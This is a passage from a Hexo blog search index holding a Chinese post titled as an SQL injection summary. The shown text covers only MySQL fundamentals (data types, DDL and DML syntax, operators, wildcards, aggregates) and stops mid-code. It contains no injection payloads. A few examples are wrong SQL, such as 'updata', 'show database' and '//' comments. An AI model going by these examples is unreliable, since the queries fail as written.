<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入总结(超详细)</title>
      <link href="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/"/>
      <url>/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a><strong>环境配置</strong></h3><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ%E6%88%AA%E5%9B%BE20231218174435.png"></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a><strong>定义</strong></h3><p><strong>MySQL</strong>为关系型数据库(Relational Database Management System), 这种所谓的”关系型”可以理解为”表格”的概念, 一个关系型数据库由一个或<strong>数个表格</strong>组成, 如图所示的一个表格:</p><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ%E6%88%AA%E5%9B%BE20231218175654.png"></p><ul><li><p><strong>表头</strong>(header): 每一列的名称。</p></li><li><p><strong>列</strong>(col): 具有相同数据类型的数据的集合。</p></li><li><p><strong>行</strong>(row): 每一行用来描述某条记录的具体信息。</p></li><li><p><strong>值</strong>(value): 行的具体信息, 每个值必须与该列的数据类型相同。</p></li><li><p><strong>键(key)</strong>: 键的值在当前列中具有唯一性。</p></li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h4><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">范围（有符号）</th><th align="left">范围（无符号）</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1 Bytes</td><td align="left">(-128，127)</td><td align="left">(0，255)</td><td align="left">小整数值</td></tr><tr><td align="left">SMALLINT</td><td align="left">2 Bytes</td><td align="left">(-32 768，32 767)</td><td align="left">(0，65 535)</td><td align="left">大整数值</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3 Bytes</td><td align="left">(-8 388 608，8 388 607)</td><td align="left">(0，16 777 215)</td><td align="left">大整数值</td></tr><tr><td align="left">INT或INTEGER</td><td align="left">4 Bytes</td><td align="left">(-2 147 483 648，2 147 483 647)</td><td align="left">(0，4 294 967 295)</td><td align="left">大整数值</td></tr><tr><td align="left">BIGINT</td><td align="left">8 Bytes</td><td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td align="left">(0，18 446 744 073 709 551 615)</td><td align="left">极大整数值</td></tr><tr><td align="left">FLOAT</td><td align="left">4 Bytes</td><td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td align="left">单精度 浮点数值</td></tr><tr><td align="left">DOUBLE</td><td align="left">8 Bytes</td><td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">双精度 浮点数值</td></tr><tr><td align="left">DECIMAL</td><td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td align="left">依赖于M和D的值</td><td align="left">依赖于M和D的值</td><td align="left">小数值</td></tr></tbody></table><h4 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h4><table><thead><tr><th align="left">类型</th><th align="left">大小 ( bytes)</th><th align="left">范围</th><th align="left">格式</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">3</td><td align="left">1000-01-01&#x2F;9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘-838:59:59’&#x2F;‘838:59:59’</td><td align="left">HH:MM:SS</td><td align="left">时间值或持续时间</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">1901&#x2F;2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td><td align="left">YYYY-MM-DD hh:mm:ss</td><td align="left">混合日期和时间值</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td align="left">YYYY-MM-DD hh:mm:ss</td><td align="left">混合日期和时间值，时间戳</td></tr></tbody></table><h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">0-255 bytes</td><td align="left">定长字符串</td></tr><tr><td align="left">VARCHAR</td><td align="left">0-65535 bytes</td><td align="left">变长字符串</td></tr><tr><td align="left">TINYBLOB</td><td align="left">0-255 bytes</td><td align="left">不超过 255 个字符的二进制字符串</td></tr><tr><td align="left">TINYTEXT</td><td align="left">0-255 bytes</td><td align="left">短文本字符串</td></tr><tr><td align="left">BLOB</td><td align="left">0-65 535 bytes</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="left">TEXT</td><td align="left">0-65 535 bytes</td><td align="left">长文本数据</td></tr><tr><td align="left">MEDIUMBLOB</td><td align="left">0-16 777 215 bytes</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="left">MEDIUMTEXT</td><td align="left">0-16 777 215 bytes</td><td align="left">中等长度文本数据</td></tr><tr><td align="left">LONGBLOB</td><td align="left">0-4 294 967 295 bytes</td><td align="left">二进制形式的极大文本数据</td></tr><tr><td align="left">LONGTEXT</td><td align="left">0-4 294 967 295 bytes</td><td align="left">极大文本数据</td></tr></tbody></table><blockquote><p>char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。</p></blockquote><h4 id="枚举与集合类型（Enumeration-and-Set-Types）"><a href="#枚举与集合类型（Enumeration-and-Set-Types）" class="headerlink" title="枚举与集合类型（Enumeration and Set Types）"></a>枚举与集合类型（Enumeration and Set Types）</h4><ul><li><strong>ENUM</strong>: 枚举类型，用于存储单一值，可以选择一个预定义的集合。</li><li><strong>SET</strong>: 集合类型，用于存储多个值，可以选择多个预定义的集合。</li></ul><h3 id="库操作"><a href="#库操作" class="headerlink" title="库操作"></a>库操作</h3><ul><li><p><strong>创建数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE 数据库名;</span><br></pre></td></tr></table></figure></li><li><p><strong>查看数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> database 数据库名;</span><br></pre></td></tr></table></figure></li><li><p><strong>删除数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE <span class="operator">&lt;</span>database_name<span class="operator">&gt;</span>;        <span class="operator">/</span><span class="operator">/</span> 直接删除数据库，不检查是否存在</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> DATABASE [IF <span class="keyword">EXISTS</span>] <span class="operator">&lt;</span>database_name<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>修改数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> database<span class="operator">|</span>schema db_name</span><br></pre></td></tr></table></figure></li></ul><h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><h4 id="表约束"><a href="#表约束" class="headerlink" title="表约束"></a>表约束</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> users (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    email <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    seat <span class="type">INT</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">    birthdate <span class="type">DATE</span>,</span><br><span class="line">    is_active <span class="type">BOOLEAN</span> <span class="keyword">DEFAULT</span> <span class="literal">TRUE</span>,</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> fk <span class="keyword">FOREIGN KEY</span>(tid) <span class="keyword">REFERENCES</span> teachers(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><p><strong>非空约束(not null)</strong></p><p>用not null约束的字段不能为null值，必须给定具体的数据</p></li><li><p><strong>唯一性约束(unique)</strong></p><p>unique约束的字段，具有唯一性，不可重复，但可以为null</p></li><li><p><strong>主键约束(primary key) PK</strong></p></li><li><p><strong>外键约束(foreign key)FK</strong></p><p>只能是表级定义（如以下例子）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreign key</span>(classno) <span class="keyword">references</span> t_class(cno)</span><br></pre></td></tr></table></figure></li><li><p><strong>检查约束(目前MySQL不支持、Oracle支持)</strong></p></li></ul><h4 id="数据表管理"><a href="#数据表管理" class="headerlink" title="数据表管理"></a>数据表管理</h4><ul><li><p><strong>创建表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p><strong>修改表</strong></p><ul><li><p><strong>add</strong></p><p><strong>用于增加新字段和完整型约束</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">add</span> <span class="operator">&lt;</span>新表名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure><blockquote><p><strong>first和after</strong>为可选项，分别用于将新添加的字段设置为表的第一个字段和将添加的字段添加到指定的”已有字段名”之后</p><p><strong>添加多个字段要用括号括起来</strong></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> s</span><br><span class="line"><span class="keyword">add</span> class_no <span class="type">varchar</span>(<span class="number">6</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> s</span><br><span class="line"><span class="keyword">add</span> (class_no <span class="type">varchar</span>(<span class="number">6</span>),address nvarchar(<span class="number">20</span>));</span><br></pre></td></tr></table></figure></li><li><p><strong>rename</strong></p><p><strong>用于修改表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>旧表名<span class="operator">&gt;</span></span><br><span class="line">rename <span class="operator">&lt;</span>新表名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>change</strong></p><p><strong>用于修改字段名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">change <span class="operator">&lt;</span>旧字段名<span class="operator">&gt;</span> <span class="operator">&lt;</span>新字段名<span class="operator">&gt;</span> <span class="operator">&lt;</span>新数据类型<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>modify</strong></p><p>用于<strong>修改字段数据类型和字段排序</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">modify <span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span> [<span class="keyword">first</span><span class="operator">|</span>after 字段名<span class="number">2</span>];</span><br></pre></td></tr></table></figure></li><li><p><strong>engine</strong></p><p>用于<strong>修改表的存储引擎</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">engine<span class="operator">=</span><span class="operator">&lt;</span>修改后存储引擎名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>drop</strong></p><p>用于<strong>删除字段和完整型约束</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>旧表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="operator">&lt;</span>字段名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>旧表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">CONSTRAINT</span> <span class="operator">&lt;</span>约束名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>删除表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>查看表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">describe</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;  <span class="operator">/</span><span class="operator">/</span>查看表结构</span><br></pre></td></tr></table></figure></li></ul><h4 id="表中数据操纵"><a href="#表中数据操纵" class="headerlink" title="表中数据操纵"></a>表中数据操纵</h4><ul><li><p><strong>insert</strong></p><p>用于<strong>在表中添加一条新纪录</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span><span class="operator">|</span>replace <span class="keyword">into</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>[(<span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span>[,<span class="operator">&lt;</span>字段名<span class="number">2</span><span class="operator">&gt;</span>...])] <span class="keyword">values</span>(<span class="operator">&lt;</span>值<span class="operator">&gt;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span><span class="operator">|</span>replace <span class="keyword">into</span> s(sno,sn,age)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">&#x27;s9&#x27;</span>,<span class="string">&#x27;小明&#x27;</span>,<span class="number">21</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span><span class="operator">|</span>replace <span class="keyword">into</span> s(sno,sn,age)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">&#x27;s9&#x27;</span>,<span class="string">&#x27;小明&#x27;</span>,<span class="number">21</span>),</span><br><span class="line">(<span class="string">&#x27;s8&#x27;</span>,<span class="string">&#x27;小红&#x27;</span>,<span class="number">20</span>)；</span><br></pre></td></tr></table></figure></li><li><p><strong>update</strong></p><p><strong>用于修改数据表中的数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">updata <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">set</span> <span class="operator">&lt;</span>字段名<span class="operator">&gt;=</span><span class="operator">&lt;</span>表达式<span class="operator">&gt;</span>...</span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updata t</span><br><span class="line"><span class="keyword">set</span> dept<span class="operator">=</span><span class="string">&#x27;工学院&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>delete</strong></p><p>用于<strong>删除数据表中数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span></span><br><span class="line"><span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure><blockquote><p>where句省略时，会删除表中所有记录</p></blockquote></li></ul><h4 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="keyword">condition</span>]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>]]</span><br><span class="line">[LIMIT number];</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>ORDER BY column_name [ASC | DESC]</code> 是一个可选的子句，用于指定结果集的排序顺序，默认是升序（ASC）。</li><li><code>LIMIT number</code> 是一个可选的子句，用于限制返回的行数。</li></ul></blockquote><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><ul><li><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">&#x3D;</td><td align="left">等号，检测两个值是否相等，如果相等返回true</td><td align="left">(A &#x3D; B) 返回false。</td></tr><tr><td align="left">&lt;&gt;, !&#x3D;</td><td align="left">不等于，检测两个值是否相等，如果不相等返回true</td><td align="left">(A !&#x3D; B) 返回 true。</td></tr><tr><td align="left">&gt;</td><td align="left">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td><td align="left">(A &gt; B) 返回false。</td></tr><tr><td align="left">&lt;</td><td align="left">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td><td align="left">(A &lt; B) 返回 true。</td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td><td align="left">(A &gt;&#x3D; B) 返回false。</td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td><td align="left">(A &lt;&#x3D; B) 返回 true。</td></tr><tr><td align="left">IS NULL 或者 ISNULL</td><td align="left">判断一个值是否为空</td><td align="left">如果为 NULL，返回值为 1，否则返回值为 0</td></tr><tr><td align="left">IS NOT NULL</td><td align="left">判断一个值是否不为空</td><td align="left">如果非 NULL，返回值为 1，否则返回值为 0</td></tr><tr><td align="left">BETWEEN AND</td><td align="left">判断一个值是否落在两个值之间</td><td align="left">大于等于 min 并且小于等于 max，那么返回值为 1，否则返回值为 0</td></tr><tr><td align="left">IN</td><td align="left">判断操作数是否为IN列表中的一个值</td><td align="left">如果是则返回1，否则返回0，对于NULL则返回NULL</td></tr><tr><td align="left">NOT IN</td><td align="left">判断操作数是否不属于IN列表</td><td align="left">如果是则返回1，否则返回0，对于NULL则返回NULL</td></tr><tr><td align="left">LIKE</td><td align="left">用于匹配字符串</td><td align="left">返回的结果值有1、0与NULL</td></tr><tr><td align="left">REGEXP</td><td align="left">正则表达式</td><td align="left">1. 匹配不区分大小写<br>2. 可以使用 BINARY 关键字进行区分大小写<br>3. 匹配可使用的通配符非常多，与其他通配符普适</td></tr></tbody></table></li><li><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th align="left">运算符号</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">NOT 或 !</td><td align="left">逻辑非</td></tr><tr><td align="left">AND</td><td align="left">逻辑与</td></tr><tr><td align="left">OR</td><td align="left">逻辑或</td></tr><tr><td align="left">XOR</td><td align="left">逻辑异或</td></tr></tbody></table></li><li><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><table><thead><tr><th align="left">运算符号</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">&amp;</td><td align="left">按位与</td></tr><tr><td align="left">|</td><td align="left">按位或</td></tr><tr><td align="left">^</td><td align="left">按位异或</td></tr><tr><td align="left">!</td><td align="left">取反</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">左移</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">右移</td></tr><tr><td align="left">~</td><td align="left">按位非</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">&amp;</span> <span class="number">3</span>;  <span class="comment">-- 输出：1（二进制：0101 &amp; 0011 = 0001）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">|</span> <span class="number">3</span>;  <span class="comment">-- 输出：7（二进制：0101 | 0011 = 0111）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">^</span> <span class="number">3</span>;  <span class="comment">-- 输出：6（二进制：0101 ^ 0011 = 0110）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">~</span><span class="number">5</span>;     <span class="comment">-- 输出：-6（二进制：~0101 = 1010，在有符号二进制补码表示中）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">2</span> <span class="operator">&lt;&lt;</span> <span class="number">1</span>; <span class="comment">-- 输出：4（二进制：0010 &lt;&lt; 1 = 0100）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">4</span> <span class="operator">&gt;&gt;</span> <span class="number">1</span>; <span class="comment">-- 输出：2（二进制：0100 &gt;&gt; 1 = 0010）</span></span><br></pre></td></tr></table></figure></li><li><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><table><thead><tr><th align="left">通配符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>%</code></td><td align="left">替代 0 个或多个字符</td></tr><tr><td align="left"><code>_</code></td><td align="left">替代一个字符</td></tr><tr><td align="left">[]</td><td align="left">字符列中的任何单一字符</td></tr><tr><td align="left">[^] 或 [!]</td><td align="left">不在字符列中的任何单一字符</td></tr></tbody></table></li></ul><p>等于条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;test&#x27;;</span><br></pre></td></tr></table></figure><p>不等于条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username != &#x27;runoob&#x27;;</span><br></pre></td></tr></table></figure><p>大于条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE price &gt; 50.00;</span><br></pre></td></tr></table></figure><p>小于条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date &lt; &#x27;2023-01-01&#x27;;</span><br></pre></td></tr></table></figure><p>大于等于条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM employees WHERE salary &gt;= 50000;</span><br></pre></td></tr></table></figure><p>小于等于条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students WHERE age &lt;= 21;</span><br></pre></td></tr></table></figure><p>组合条件（AND、OR）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category = &#x27;Electronics&#x27; AND price &gt; 100.00;</span><br><span class="line"></span><br><span class="line">SELECT * FROM orders WHERE order_date &gt;= &#x27;2023-01-01&#x27; OR total_amount &gt; 1000.00;</span><br></pre></td></tr></table></figure><p>模糊匹配条件（LIKE）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM customers WHERE first_name LIKE &#x27;J%&#x27;;</span><br></pre></td></tr></table></figure><p>IN 条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM countries WHERE country_code IN (&#x27;US&#x27;, &#x27;CA&#x27;, &#x27;MX&#x27;);</span><br></pre></td></tr></table></figure><p>NOT 条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE NOT category = &#x27;Clothing&#x27;;</span><br></pre></td></tr></table></figure><p>BETWEEN 条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date BETWEEN &#x27;2023-01-01&#x27; AND &#x27;2023-12-31&#x27;;</span><br></pre></td></tr></table></figure><p>IS NULL 条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM employees WHERE department IS NULL;</span><br></pre></td></tr></table></figure><p>IS NOT NULL 条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM customers WHERE email IS NOT NULL;</span><br></pre></td></tr></table></figure><h5 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a><strong>聚合函数</strong></h5><ul><li><strong>count() ：统计记录的条数；</strong></li><li><strong>sum()：计算字段的值的总和；</strong></li><li><strong>avg()：可以求出表中某个字段取值的平均值；</strong></li><li><strong>max()：可以求出表中某个字段取值的最大值；</strong></li><li><strong>min()：可以求出表中某个字段取值的最小值。</strong></li></ul><h5 id="模糊查询（LIKE）"><a href="#模糊查询（LIKE）" class="headerlink" title="模糊查询（LIKE）"></a>模糊查询（LIKE）</h5><p><code>LIKE</code> 语句是 MySQL 中用于模糊匹配查询的工具。通过使用通配符（<code>%</code> 和 <code>_</code>），我们可以灵活地查找符合特定模式的字符串。这在对文本进行搜索时非常有用。常搭配<strong>通配符</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 